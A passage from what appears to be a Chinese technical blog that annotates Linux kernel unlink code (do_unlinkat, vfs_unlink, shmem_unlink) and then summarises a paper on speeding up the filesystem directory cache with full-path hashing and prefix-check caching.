&amp;type); // 获取父目录 if (error) goto exit1; // 如果出错，跳转到 exit1 error = -EISDIR; // 设置错误码为 -EISDIR（是一个目录） if (type != LAST_NORM) // 如果类型不是 LAST_NORM goto exit2; // 跳转到 exit2 error = mnt_want_write(path.mnt); // 检查是否允许写入 if (error) goto exit2; // 如果出错，跳转到 exit2retry_deleg: // 重试委托标签 inode_lock_nested(path.dentry-&gt;d_inode, I_MUTEX_PARENT); // 对父目录进行加锁 dentry = __lookup_hash(&amp;last, path.dentry, lookup_flags); // 查找目录项 error = PTR_ERR(dentry); // 获取错误码 if (!IS_ERR(dentry)) &#123; // 如果没有错误 // 为什么要放在这里？因为我们需要正确的错误值 if (last.name[last.len]) goto slashes; // 如果 last.name[last.len] 不为 0，跳转到 slashes inode = dentry-&gt;d_inode; // 获取文件的 inode if (d_is_negative(dentry)) goto slashes; // 如果目录项是负的，跳转到 slashes ihold(inode); // 增加 inode 引用计数 error = security_path_unlink(&amp;path, dentry); // 检查安全策略 if (error) goto exit3; // 如果出错，跳转到 exit3 error = vfs_unlink(mnt_idmap(path.mnt), path.dentry-&gt;d_inode, dentry, &amp;delegated_inode); // 删除文件链接exit3: dput(dentry); // 释放目录项 &#125; inode_unlock(path.dentry-&gt;d_inode); // 解锁父目录 if (inode) iput(inode); // 如果 inode 存在，截断 inode inode = NULL; // 将 inode 置为空 if (delegated_inode) &#123; // 如果委托 inode 存在 error = break_deleg_wait(&amp;delegated_inode); // 等待委托中断 if (!error) goto retry_deleg; // 如果没有错误，跳转到 retry_deleg &#125; mnt_drop_write(path.mnt); // 放弃写权限exit2: path_put(&amp;path); // 释放路径 if (retry_estale(error, lookup_flags)) &#123; // 如果需要重试 lookup_flags |= LOOKUP_REVAL; // 更新查找标志 inode = NULL; // 将 inode 置为空 goto retry; // 跳转到 retry &#125;exit1: putname(name); // 释放文件名 return error; // 返回错误码slashes: // slashes 标签 if (d_is_negative(dentry)) // 如果目录项是负的 error = -ENOENT; // 错误码设置为 -ENOENT（文件不存在） else if (d_is_dir(dentry)) // 如果目录项是目录 error = -EISDIR; // 错误码设置为 -EISDIR（是一个目录） else error = -ENOTDIR; // 错误码设置为 -ENOTDIR（不是一个目录） goto exit3; // 跳转到 exit3&#125; vfs_unlink函数vfs_unlink identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/** * vfs_unlink - 删除文件系统对象的链接 * @idmap: 挂载点的 idmap * @dir: 父目录 * @dentry: 受害者 * @delegated_inode: 如果 inode 被委托，返回受害者 inode。 * * 调用者必须持有 dir-&gt;i_mutex。 * * 如果 vfs_unlink 发现一个委托，它将返回 -EWOULDBLOCK，并 * 在 delegated_inode 中返回对 inode 的引用。调用者 * 应该在那个 inode 上中断委托并重试。因为 * 中断委托可能需要很长时间，调用者在执行此操作之前应放弃 * dir-&gt;i_mutex。 * * 或者，调用者可以为 delegated_inode 传递 NULL。这可能 * 适用于期望底层文件系统不是 NFS 导出的调用者。 * * 如果通过 idmapped 挂载找到了 inode，则必须通过 @idmap 传递 vfsmount 的 idmap。 * 该函数将在检查权限之前根据 @idmap 映射 inode。 * 在非 idmapped 挂载上或者对原始 inode 执行权限检查，只需传递 @nop_mnt_idmap。 */int vfs_unlink(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry, struct inode **delegated_inode)&#123; struct inode *target = dentry-&gt;d_inode; // 目标 inode int error = may_delete(idmap, dir, dentry, 0); // 检查是否可以删除 if (error) // 如果有错误 return error; // 返回错误 if (!dir-&gt;i_op-&gt;unlink) // 如果没有提供 unlink 操作 return -EPERM; // 返回 -EPERM（不允许的操作） inode_lock(target); // 锁定目标 inode if (IS_SWAPFILE(target)) // 如果目标是交换文件 error = -EPERM; // 返回 -EPERM（不允许的操作） else if (is_local_mountpoint(dentry)) // 如果 dentry 是本地挂载点 error = -EBUSY; // 返回 -EBUSY（设备或资源忙） else &#123; error = security_inode_unlink(dir, dentry); // 检查安全策略 if (!error) &#123; // 如果没有错误 error = try_break_deleg(target, delegated_inode); // 尝试中断委托 if (error) // 如果有错误 goto out; // 跳转到 out error = dir-&gt;i_op-&gt;unlink(dir, dentry); // 执行 unlink 操作 if (!error) &#123; // 如果没有错误 dont_mount(dentry); // 不要挂载 dentry detach_mounts(dentry); // 分离挂载点 &#125; &#125; &#125;out: // out 标签 inode_unlock(target); // 解锁目标 inode // 我们不删除 NFS sillyrenamed 文件的 d_delete() - 它们仍然存在。 if (!error &amp;&amp; dentry-&gt;d_flags &amp; DCACHE_NFSFS_RENAMED) &#123; fsnotify_unlink(dir, dentry); // 发送文件系统通知 &#125; else if (!error) &#123; fsnotify_link_count(target); // 更新链接计数 d_delete_notify(dir, dentry); // 发送删除通知 &#125; return error; // 返回错误&#125;EXPORT_SYMBOL(vfs_unlink); dir-&gt;i_op-&gt;unlink设置为shmem_unlink函数 参考上文中的inode-&gt;i_op-&gt;lookup函数指向 simple_lookup() 函数 123456789101112131415161718192021222324static const struct inode_operations shmem_dir_inode_operations = &#123;#ifdef CONFIG_TMPFS .getattr = shmem_getattr, .create = shmem_create, .lookup = simple_lookup,//这里定义了lookup函数 .link = shmem_link, .unlink = shmem_unlink,//这里定义了unlink函数 .symlink = shmem_symlink, .mkdir = shmem_mkdir, .rmdir = shmem_rmdir, .mknod = shmem_mknod, .rename = shmem_rename2, .tmpfile = shmem_tmpfile,#endif#ifdef CONFIG_TMPFS_XATTR .listxattr = shmem_listxattr, .fileattr_get = shmem_fileattr_get, .fileattr_set = shmem_fileattr_set,#endif#ifdef CONFIG_TMPFS_POSIX_ACL .setattr = shmem_setattr, .set_acl = simple_set_acl,#endif&#125;; shmem_unlink identifier - Linux source code (v6.3.6) - Bootlin 12345678910111213141516static int shmem_unlink(struct inode *dir, struct dentry *dentry)&#123; struct inode *inode = d_inode(dentry); // 获取 dentry 对应的 inode // 如果 inode 的链接数大于 1 且 inode 不是目录，则释放 inode if (inode-&gt;i_nlink &gt; 1 &amp;&amp; !S_ISDIR(inode-&gt;i_mode)) shmem_free_inode(inode-&gt;i_sb); dir-&gt;i_size -= BOGO_DIRENT_SIZE; // 减小父目录的大小 // 更新 inode 和父目录的 ctime 和 mtime 为当前时间 inode-&gt;i_ctime = dir-&gt;i_ctime = dir-&gt;i_mtime = current_time(inode); inode_inc_iversion(dir); // 增加父目录的 i_version drop_nlink(inode); // 减少 inode 的链接数 dput(dentry); // 撤销 &quot;create&quot; 操作的计数，完成所有工作 return 0; // 返回 0，表示成功&#125; 参考资料 Tmpfs — The Linux Kernel documentation — Tmpfs — Linux 内核文档 tmpfs - 维基百科，自由的百科全书 (wikipedia.org) tmpfs - ArchWiki (archlinux.org) GPT-4 Linux操作系统学习笔记（十二）虚拟文件系统 | Ty-Chen’s HomeK","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"文件系统","slug":"Linux内核/文件系统","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"论文阅读 How to Get More Value From Your File System Directory Cache","slug":"论文阅读-How-to-Get-More-Value-From-Your-File-System-Directory-Cache","date":"2023-06-08T08:21:52.000Z","updated":"2023-06-11T14:34:56.714Z","comments":true,"path":"2023/06/08/论文阅读-How-to-Get-More-Value-From-Your-File-System-Directory-Cache/","link":"","permalink":"http://example.com/2023/06/08/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-How-to-Get-More-Value-From-Your-File-System-Directory-Cache/","excerpt":"Abstract 应用程序经常请求文件系统操作来遍历文件系统目录树,例如打开文件或读取文件元数据。因此,在内存中缓存文件系统目录结构和元数据对操作系统内核的性能优化非常重要。 本文确定了几个设计原则,可以在应用程序和文件系统透明的情况下显著提高命中率并降低命中成本。具体而言,我们的目录缓存设计可以在恒定数量的散列表操作中查找目录,将查找路径与权限检查分离,对访问控制检查的结果进行记忆化,使用签名加速查找,并通过缓存目录完整性降低未命中率。","text":"Abstract 应用程序经常请求文件系统操作来遍历文件系统目录树,例如打开文件或读取文件元数据。因此,在内存中缓存文件系统目录结构和元数据对操作系统内核的性能优化非常重要。 本文确定了几个设计原则,可以在应用程序和文件系统透明的情况下显著提高命中率并降低命中成本。具体而言,我们的目录缓存设计可以在恒定数量的散列表操作中查找目录,将查找路径与权限检查分离,对访问控制检查的结果进行记忆化,使用签名加速查找,并通过缓存目录完整性降低未命中率。 该设计可以满足POSIX、Linux安全模块、命名空间和装入别名等差异性要求的一系列要求。这些优化对实际应用程序是一个重要的净改进,例如可以将Dovecot IMAP服务器的吞吐量提高12%,并将updatedb实用程序的吞吐量提高29%。 文件系统目录缓存是将文件系统的目录结构和元数据信息缓存在内存中的技术。它的主要目的是提高文件系统操作的性能。 文件系统目录缓存的主要思想是:应用程序在访问文件系统时,大部分操作是在已访问过的目录下进行的。如果能将这些目录信息缓存在内存中,那么应用程序访问这些目录时就不需要再去实际的文件系统中加载目录信息,可以直接从缓存中获取,这样可以大大减少对文件系统的访问,提高性能。 文件系统目录缓存会缓存诸如: 目录结构:将整个目录树缓存在内存中,包括子目录,文件等信息。 目录元数据:每个目录的元数据,如inode号,大小,权限,所有者等信息。 文件元数据:每个文件的元数据,如inode号,大小,权限,所有者等信息。 权限信息:已检查过的目录和文件的权限信息,避免重复检查。 签名信息:目录和文件的签名,用于加速查找。 通过缓存这些信息,应用程序可以避免大量的文件系统访问,直接从缓存中获取需要的信息,从而提高性能。这对文件系统的操作密集型应用程序有很大帮助,如邮件服务器,数据库等。 所以,文件系统目录缓存的关键是通过缓存来减少文件系统访问,在应用程序与文件系统之间添加一层缓存,提高整体的目录操作性能。这是操作系统在管理文件系统与提高性能方面常用的一种技术手段。 应用程序经常需要遍历文件系统目录树来进行文件系统操作,如打开文件或读取文件元数据。这需要频繁访问文件系统,对操作系统内核的性能有很大影响。 因此,在内存中缓存文件系统目录结构和元数据信息可以显著优化操作系统内核的性能。这是因为应用程序可以直接从缓存中获取信息,避免访问文件系统。 本文提出了一些目录缓存的设计原则,可以在应用程序和文件系统之间transparently提高命中率和降低未命中成本。transparently意味着应用程序不需要改变代码,缓存的使用对其透明。 目录缓存设计使用散列表在恒定次数的操作中查找目录,可以加速目录查找。散列表是一种高效的数据结构,可以在固定次数内查找到信息。 将查找路径和权限检查分离,意思是首先查找目录,然后再进行权限检查。这避免了在权限检查时重复查找目录,提高性能。 对访问控制检查的结果进行记忆化,意思是缓存文件或目录的权限信息,避免下次再检查,提高性能。 使用签名加速查找,使用目录文件签名(如CRC码)进行查找,避免字符串比对,加速查找。 通过缓存目录完整性降低未命中率,意思是缓存整个目录树信息,使应用程序可以在缓存中完成大部分操作,避免访问文件系统,减少未命中。 该设计可以符合各种要求,如POSIX、Linux安全模块、命名空间和装入别名等,所以可以广泛使用。 该设计对实际应用程序有明显改进,可以提高Dovecot IMAP服务器12%的吞吐量,updatedb工具29%的吞吐量,展示了该方案的优异性能。 Introduction操作系统内核通常在虚拟文件系统(VFS)层中缓存文件系统数据和元数据,该层将底层文件系统抽象为常见API(如POSIX)。 指Linux内核。VFS是Linux内核中的一层,它虚拟化了底层的文件系统,如ext4、xfs等。VFS层会缓存从这些底层文件系统读取的数据和元数据(如文件属性)。VFS层对上层应用程序来说隐藏了底层文件系统的细节,它提供了常用的文件系统API,如POSIX接口。这使得应用程序可以通过VFS层访问底层不同的文件系统,而不需要关心它们的差异。 计算机底层的指令系统是不同的,如x86和ARM架构的指令系统不同。但我们编程时使用的指令是一致的,如加法指令都是+,这是因为编程语言将底层不同的指令系统虚拟化成一致的指令接口。程序员使用这一接口,不需要关心底层指令的差异。 同样,虚拟机将不同的物理计算机虚拟化成同一逻辑计算机,从而运行相同的操作系统和应用程序。虚拟机屏蔽了底层不同的物理机,为最终用户提供了统一的计算机接口。 所以,总结来说,虚拟化通过抽象和隐藏底层的差异与实现细节,提供了更高层的统一逻辑接口。这使得高层用户(如应用程序或最终用户)无需关心底层的异构与复杂性,可以更简单地使用接口所提供的功能。 VFS层虚拟化文件系统,就是采取这样的方式,将不同的文件系统抽象成统一的文件系统接口,屏蔽底层文件系统之间的差异,为应用程序和用户提供简单的文件系统操作方法。这有效地隔离了上层的Linux内核与应用程序与底层具体的文件系统实现。 POSIX定义了一套统一的操作系统接口标准,包括API、系统调用、实用程序等,使得应用程序可以在不同的操作系统上移植和运行。Linux等操作系统都实现了POSIX接口,使得Linux下的应用程序可以很容易在其他POSIX兼容系统中使用。 VFS层提供的POSIX接口,就是遵循POSIX标准,实现了诸如open、read、fork等操作系统调用和API,从而屏蔽了底层文件的系统差异,使应用程序可以直接使用POSIX接口访问各种文件系统。 缓存层已经成为隐藏持久存储技术(如本地磁盘)访问延迟的普遍优化手段。目录缓存不仅仅是性能优化;它还简化了安装多个文件系统、一致的文件句柄行为和高级安全模型(如SELinux)的实现。 缓存层指的是在系统设计中加入的缓存机制,用于暂存数据或计算结果,从而优化性能。在这里,缓存层特指操作系统在虚拟文件系统(VFS)与具体文件系统之间加入的目录缓存机制。目录缓存缓存了文件系统的目录结构、元数据与访问信息,使VFS层可以直接从缓存中获取这些信息,减少对底层文件系统的访问,优化整体的文件系统性能。 目录缓存可以简化在一个系统上安装和使用多个文件系统。因为目录缓存抽象了底层文件系统的差异,使上层可以以同一方式访问不同的文件系统。 文件句柄是应用程序访问文件时使用的一个抽象接口。通过目录缓存,应用程序可以使用相同的文件句柄接口访问不同的文件系统,而不需要关心底层文件系统的差异与实现细节。 文件句柄是应用程序访问文件时使用的一个抽象表示。应用程序可以通过文件名打开一个文件,获取代表该文件的文件句柄,然后使用文件句柄对文件进行各种操作,如读写等,而不再指定文件名。 举个例子,在C语言中,应用程序可以通过fopen()函数使用文件名打开一个文件,获取FILE类型的文件句柄: 1FILE *fp = fopen(&quot;file.txt&quot;, &quot;r&quot;); 然后应用程序可以通过文件句柄fp对文件进行操作: 123fread(buf, 1, 10, fp); // 从文件读取10个字节fwrite(buf, 1, 10, fp); // 向文件写入10个字节fclose(fp); // 关闭文件 在这里,FILE *fp就是文件file.txt的文件句柄,应用程序通过它对文件进行访问,而不再指定文件名。 所以,文件句柄的作用是: 将文件在应用程序中的表示抽象化,屏蔽了底层文件的实现细节与差异。 使应用程序可以通过统一的文件句柄接口访问不同的文件,而不需要关心每种文件对应的实现方法。 方便应用程序通过文件句柄快速访问文件,而不需要反复指定文件名。 返回到这句话,它表达的意思是:通过目录缓存,应用程序可以使用同样的文件句柄接口访问不同种类的文件系统,而不需要关心底层文件系统的差异。这是因为目录缓存抽象了底层文件系统的细节,为应用程序提供了统一的文件访问接口。 目录缓存对良好的应用程序性能至关重要。许多常见的系统调用必须对文件路径进行操作,这需要目录缓存查找。例如,iBench系统调用跟踪中的10-20%的系统调用执行路径查找。 许多系统调用，如：open\\stat\\unlink等都需要使用文件的路径作为参数。这些系统调用在执行时,需要查找目录以定位文件,这需要目录缓存的支持。有10-20%的系统调用会执行路径查找。 图1列出了几种常见的命令行应用程序在执行基于路径的系统调用时花费的总执行时间的百分比(有关这些应用程序和测试机器的更多详细信息,请参阅§6)。我们注意到,这些系统调用包括路径查找以外的工作,这些数字包括一些检测开销;尽管如此,除rm外,系统调用时间和计数以stat和open为主,其中路径查找是执行时间的重要组成部分。对于这些应用程序,基于路径的系统调用占总执行时间的6-54%。这意味着降低路径查找延迟是内核提高这些应用程序执行时间的最大机会之一。 不幸的是,即使目录缓存命中也是昂贵的——我们的测试Linux系统上的stat为 0.3-1.1微秒,相比之下getppid只有0.04微秒,4 KB预读只有0.3微秒。这个问题在Linux内核社区尤其受到重视,该社区对其目录缓存进行了重大修订和越来越复杂的优化,以降低其命中成本,例如从读取路径中删除锁或在重试循环中用死锁避免替换锁定顺序。图2 plotting目录缓存命中延迟与Linux几个版本中更改的目录缓存代码行数,使用测试系统上的路径到inode查找微基准。这些努力已将命中延迟从2011年到2013年提高了47%,但在过去三年中已停滞不前。 问题的根源似乎是POSIX路径权限语义要求与路径组件数量线性相关的工作,并严重限制内核开发人员的实现选项。例如,要打开&#x2F;X&#x2F;Y&#x2F;Z文件,必须对父目录&#x2F;、&#x2F;X和&#x2F;X&#x2F;Y有搜索权限,并且有权访问文件Z。Linux实现简单地从上至下遍历目录树以检查权限。不幸的是,当关键路径以指针为基础的数据结构(在某些体系结构上包含多核一致性的内存屏障)主导时,现代CPU最终由难以预取加载而停滞。此外,由于如此多的Linux功能是建立在此行为之上的,例如Linux 安全模块(LSM)、命名空间和安装别名,所以如果不破坏与其他Linux内核功能的后向兼容性,任何数据结构增强似乎都是不可能的。在理论上,不明显是否有更快的查找算法(如单一散列表查找)可以满足这些API规范和内核内部要求;据我们所知,以前没有人尝试过。 本文提出了目录缓存的一种分解,可以使大多数查找操作用单个散列表查找执行(§3),以及基于缓存中已有但未有效利用的信息优化以减少未命中率的优化(§5)。我们的设计通过几个关键性见解维持兼容性(§4),包括如何将路径索引与检查父权限分离,以及如何有效和安全地记忆访问控制检查的结果。 一种将目录缓存分解的方案,能使用散列表提高大多数查找的性能。 基于目录缓存中未充分利用的信息,提出的一些优化方法,以减少未命中率。 通过保持与Linux内核兼容性的几个关键设计,实现以上提高性能和减少未命中率的方案。这些关键设计包括分离路径索引和父目录权限检查、安全有效地缓存访问控制检查结果等。 作者认为,这种设计可以大幅提高目录缓存性能,解决目前Linux内核目录缓存的性能问题。 我们的优化提高了频繁查找操作的性能,但引入了几个成本,详见§3和§6,我们认为这些成本是可以接受的,并且对应用程序而言是一个净改进。 首先,这些优化会减慢对目录层次结构的不频繁修改,如目录的重命名、chmod和chown。然而,这些较慢的操作在iBench跟踪中占系统调用的不到0.01%。 其次,dcache的内存开销增加。 第三,查找由于签名冲突而有错误的可能性,可以调整为可以忽略不计且处于数据重复数据删除系统广泛使用的可接受阈值内。 在图2的微基准测试中,我们的目录缓存优化提高了lookup延迟26%,超过未修改的Linux。 本文证明这些技术可以提高频繁使用目录缓存的应用程序的性能,而对于不受益的应用程序的危害则很小。这些变化封装在VFS中——单个文件系统不必更改其代码。本文描述了在Linux 3.14中实现这些改进的原型。第2节解释了Mac OS X、FreeBSD和Solaris的目录缓存结构相当相似,这些原理应该具有普遍性。 本文的贡献如下: 对路径查找成本和改进缓存命中延迟机会的性能分析。 目录缓存设计,通过如下技术改进路径查找延迟: 按完整路径索引目录缓存,将平均情况下的查找从路径组件数量的线性减少到常量。 前缀检查缓存(PCC),将权限检查与路径缓存分离。PCC记忆权限检查,与LSM兼容。 使用路径签名减少检查散列桶冲突的成本。 识别利用内核已经拥有的元数据减少未命中率的机会,如跟踪目录是否完全在缓存中。 仔细处理许多微妙的边缘情况,这些情况会阻碍这些技术的机械应用,例如与符号链接和Linux命名空间的集成。 这些优化的全面评估。例如,我们的优化提高了Dovecot IMAP服务器的吞吐量最高达12%,updatedb的延迟最高达29%。 Background本节首先回顾目录缓存必须支持的Unix目录语义;然后解释了目录缓存是如何在现代操作系统中实现的，包括Linux、FreeBSD、Solaris、Mac OS X和Windows。 Unix Directory Hierarchy Semantics目录缓存执行的最常见操作是查找，它将路径字符串映射到内存中的索引节点结构。查找由所有基于路径的系统调用调用，包括open、stat和unlink。查找包括检查用户是否具有从进程的根目录或当前工作目录到文件的适当搜索权限，我们称之为前缀检查(prefix check)。 例如，为了让Alice读取/home/ Alice / x，她必须具有目录/、/home和/home/ Alice的搜索权限，以及文件x的读权限。为了节约起见，目录上的执行权限位编码了搜索权限。**搜索与读权限的不同之处在于，搜索只允许用户查询文件是否存在，但不能枚举文件的内容(暴力破解除外)**。SELinux和其他经过安全加固的Linux变体可以根据执行位之外的许多因素确定搜索权限，例如进程的角色或目录的扩展属性。 Linux Directory CacheLinux目录缓存(dcache)缓存dentry(目录条目)结构，它将路径映射到文件(或目录、设备等)的内存inode(其他Unix系统将索引节点的vfs级表示称为vnode)。inode存储与文件相关的元数据，如大小、权限和所有权，以及指向索引内存文件内容的基数树的指针。每个dentry至少由四个不同的结构跟踪: 分层树结构，其中每个父节点都有一个未排序的、双链的子节点列表。 一个哈希表，以父节点虚拟地址和文件名为键。 别名列表，跟踪与给定索引节点相关联的硬链接。 LRU列表，用于根据需要压缩缓存。 Linux将前缀检查与查找本身集成在一起，一次搜索一个组件的路径和检查权限。lookup不是直接使用树结构，而是使用散列表搜索每个组件。对于较大的目录，哈希表查找将比搜索未排序的子列表快。分层树结构的主要用途是自底向上驱逐条目，以维护隐式不变性，即任何条目的所有父条目也必须在缓存中。尽管所有dentry都存储在按路径键的哈希表中，但权限检查实现在哈希表中查找每个路径组件。 Linux存储负dentry(negative dentries)，它缓存已知文件不存在于磁盘上的事实。负dentries的一个常见示例是在由环境变量指定的多个路径上搜索文件，例如LD LIBRARY PATH。 Current dcache optimizations 图2所示的大部分dcache优化工作都改善了缓存命中延迟，主要是通过减少使用读-复制更新(RCU)的查找函数中的同步成本。 RCU消除了读操作所需要的原子指令。其他Unix系统将索引节点的vfs级表示称为vnode。 锁定和对单个dentry进行引用计数，将一些额外的工作推到不经常修改目录结构的代码上，例如重命名和取消链接。 最新的Linux内核在检查路径权限时也使用乐观同步，使用序列锁(本质上是版本计数器)来检测子树何时可能与遍历同时发生更改。如果乐观快速路径由于并发修改而失败，内核将返回到使用父节点和子节点交替锁定的慢路径。 由于Linux开发人员社区已经在优化其dcache方面投入了大量精力，因此我们在本文中使用Linux作为案例研究。本文中的优化不是特定于linux的，但在某些情况下，构建在其他内核可以采用的优化之上。 Other Operating SystemsFreeBSD, OS X, and Solaris.这些Unix变体都有一个目录缓存，其结构类似于Linux的[25,28,39]。每个系统都使用散列表组织其目录缓存，每次检查一个组件的路径，并存储负条目。在这里，我们使用FreeBSD作为BSD家族的一个代表性例子，根据最近的调查，它是最受欢迎的。OS X内核采用了FreeBSD的文件系统，并没有实质性地改变它们在目录元数据缓存方面的行为。 Linux的独特之处在于，hit路径避免调用低级文件系统，而其他Unix变体总是调用低级文件系统。低级文件系统可以选择退出默认结构，如果它有更专门的结构，比如大型目录，或者它可以直接实现自己的查找函数。直接管理文件系统的缓存部分是有问题的，因为对低级文件系统不可见挂载点。之前的一些研究发现这种限制很麻烦，特别是对于网络文件系统。这些Unix变体也没有在缓存中使用乐观同步，但这不是基本的。 Solaris dcache，称为直接名称查找缓存(DNLC)，具有复杂的缓存管理启发式，例如在替换决策中权衡相关性和时间局域性Solaris也有一个比FreeBSD更简单的缓存路径参考管理系统(更类似于Linux)。 WindowsWindows中的几乎所有的操作系统API抽象都由对象管理器表示。对象管理器是最接近Unix目录缓存的类比,它跟踪层次路径和权限。不幸的是,Windows内部结构的公开文档有限,尤其是对于未被动用的元数据的内部数据结构和缓存策略,所以详细比较困难。尽管如此,我们可以比较一些高级设计选择的影响。 首先,Windows只支持一种根文件系统格式,和非常有限的其他文件系统。因此,对文件系统元数据的一般目的的内存组织没有太大价值,Windows没有vnodes,dentries或其他VFS层面的概括。相反,缓存主要是文件系统的责任,磁盘和内存结构布局可能相同。 与Unix变种不同,当Windows文件系统路径没有缓存在对象管理器中时,底层文件系统负责解析完整路径,而不是一次解析一个组件。为此,Windows NT也将父目录权限传播到每个子目录的磁盘元数据,在创建或修改时间。这种方法可以直接查找,但也会产生一点易管理性问题。假设Alice使她的主目录对所有人可读:这个更改是否应传播到所有子目录?为了回答这个问题,Windows采用一个错误易发生的启发法,不改变手动修改的子权限。本文展示如何在内存中保留直接查找的性能优势,而不存储传播的分层权限在磁盘上产生的管理性问题。 Opportunities for Improvement图3显示了Linux中路径查找的主要组件所花费的时间，其中四个路径的长度不断增加。 对查找时间的第一阶影响是路径本身的长度，它决定了对每个组件进行哈希、在哈希表中查找以及对每个目录的索引节点执行权限检查的次数。这些成本在路径组件的数量上是线性的。 本文中描述的命中延迟优化使大多数这些操作的时间不变，除了散列，它仍然是路径长度的函数。 Minimizing Hit Latency本节描述dcache命中路径的算法改进。在缓存命中情况下,最昂贵的操作之一是检查进程的凭据是否允许进程从上到下搜索dentry路径(称为前缀检查prefix check)。本节展示了如何通过缓存前缀检查结果显着降低命中延迟。本节解释了优化方案,如何将其集成到现有的Linux目录缓存框架中,如何使这些缓存结果与其他文件系统操作保持一致,以及如何使用路径签名进一步加速查找。 Caching Prefix Checks像许多Unix变体一样，Linux在哈希表中存储缓存的路径到索引节点映射(dentry)(§2.2)。这个散列表由父条目的虚拟地址和下一个路径组件字符串的组合作为键值，如图4所示。内核对象的虚拟地址不会随着时间的推移而改变，并且在各个进程之间是相同的。 在实践中，前缀检查具有高度的空间和时间局部性，非常适合缓存，即使这意味着将一些额外的工作推到不经常修改的目录结构上(例如，重命名目录)。RCU已经做了这个权衡(§2.2)。 为了缓存前缀检查结果，我们必须首先将查找dentry与前缀检查解耦。我们添加了第二个系统范围的哈希表，专门用于查找dentry，称为直接查找哈希表(DLHT)。DLHT存储最近访问的按完整的、规范化的路径散列的dentry。dentry通常存在于主哈希表中，也可能存在于DLHT中。DLHT是惰性填充的，为了与目录树修改保持一致，条目可以被删除(§3.2)。 每个进程在与进程凭据(在4.1节中进一步讨论)关联的前缀检查缓存(PCC)中缓存以前前缀检查的结果,可以在具有相同权限的进程之间共享。PCC是一个散列表,缓存dentry虚拟地址和版本号(序列锁),用于检测陈旧条目(3.2节)。当前缀检查通过时,表示凭据被允许访问dentry,则将条目添加到PCC;根据LRU策略替换条目。PCC中的未命中可以表示权限被拒绝或权限检查最近未执行。 因此，给定任何路径，内核都有一个直接查找DLHT中的路径的快速路径。如果快速路径在DLHT中命中，则在进程的PCC中查找该齿列。 如果找到PCC条目并且版本计数器与缓存的计数器匹配，则使用缓存的前缀检查结果。 如果DLHT或PCC中的快速路径查找丢失，或者PCC条目中的版本计数器比dentry更老，则代码将返回到原始的Linux查找算法(慢路径)，只使用主哈希表并一次遍历一个组件。 在相对路径的情况下，例如目录/home/alice下的foo/bar，我们有效地将相对路径和当前工作目录的路径连接起来。为了实现相对路径，Linux已经在每个进程描述符(任务结构)中存储了一个指向当前工作目录条目的指针。我们没有对字符串进行记忆，而是在每个条目中存储哈希函数的中间状态，以便可以从任何前缀恢复哈希。 当前的设计包括两种非常罕见的边缘情况。首先，可以释放dentry并使用陈旧的PCC条目重新分配。我们通过使用单调递增的版本号初始化新分配的dentry来检测这种情况，允许PCC条目在重新分配时检测过时。释放一个牙齿将它从DLHT中移除。其次，版本号可以在新条目或重命名、chmod或非空目录的城镇的每2^32次初始化之后环绕;我们的设计目前通过使所有活动的pcc无效来处理封装。 图5说明了对Linux dentry结构的修改。快速dentry存储签名、标志、序列计数、挂载点、用于管理深度目录条目的列表(第5.2节)，以及用于将快速dentry添加到DLHT bucket的列表(哈希链)。PCC被添加到内核凭据结构(struct cred)中，并存储一个可调数量的由指针和序列号组成的元组;用64kb的PCC对系统进行评估。由于每个dentry指针的最高位和最低位是相同的，PCC只存储唯一的指针位(x86 64 Linux中的8-39位)以节省空间。 Coherence with Permission and Path Changes当目录或目录结构的权限被更改时(例如使用chmod或rename)，任何包含该目录的缓存前缀检查都必须无效。 我们的设计通过在更改层次结构之前使相关的PCC和DLHT条目失效，防止过时的慢路径查找被重新缓存，并利用vfs级同步来确保正确的慢路径行为，从而确保并发查找和更改的安全性。 首先，我们确保在更改目录结构后，快速路径查找不能使用陈旧的数据完成。 在发生突变(如重命名或chmod)之前，操作必须递归遍历dcache中的所有子节点，并增加fast_dentry版本计数器(seq)。 每个进程的PCC使用fast_dentry版本计数器来检测查找时缓存前缀检查的变化;增加此版本计数器将使该条目的所有PCC项无效，而无需直接修改每个PCC。对目录结构的更改(例如，mount和rename)也会从直接查找哈希表(DLHT)中删除新旧路径下的dentry。PCC和DLHT表项在慢路径上缓慢地重新填充。 其次，通过使用原子的全局序列计数器(invalidation)，我们确保不能将过时的慢路径查找的结果重新添加到DLHT或PCC中。在慢路径遍历之前和之后读取序列计数器;只有当计数器没有改变时，结果才被添加到DLHT和PCC中，这意味着没有并发关机。 第三，我们使用vfs级同步来确保慢路径与突变正确同步。例如，rename获取全局重命名锁序列锁，以及新旧父目录上的每个条目锁。当使用重命名锁进行写操作时，慢路径(即当前Linux代码)上的所有查找都必须以一种从根目录(或当前工作目录，对于相对路径)到目标子目录的交替方式锁定每个条目。在重命名完成之前，目标条目上的锁会阻止交替遍历。无效计数器防止缓存在获取dentry锁之前已经通过此点的慢路径查找的结果。我们的实现遵循VFS现有的锁定原则来避免死锁;它添加了版本计数器来检测不一致性，并退回到慢路径。 因此，相关的PCC和DLHT条目在重命名开始之前就已经失效了，阻断了快速路径； 慢速路径的遍历将被阻止，直到重命名完成和每个条目的锁被释放；并且一个序列计数器 序列计数器确保只有观察到新路径的慢速路径遍历可以重新填充DLR的 路径可以重新填充DLHT和PCC。这些递归的遍历将目录权限和结构的变化从恒定的时间转变为与子树的大小成线性关系。子树的大小。作为一个例子，重命名或chmod一个有10,000个子目录，最多深度为4的目录需要大约需要330微秒来完成。在最初的Linux内核中，重命名和chmod几乎是恒定时间操作，只需要4.5和1.1微秒。一些应用程序，如aptitude或rsync，依靠rename来原子化地替换一个目录，但这只占其总工作的一小部分，而且比查找的频率低几个数量级，这使得总体上是一个很好的权衡。 Directory References 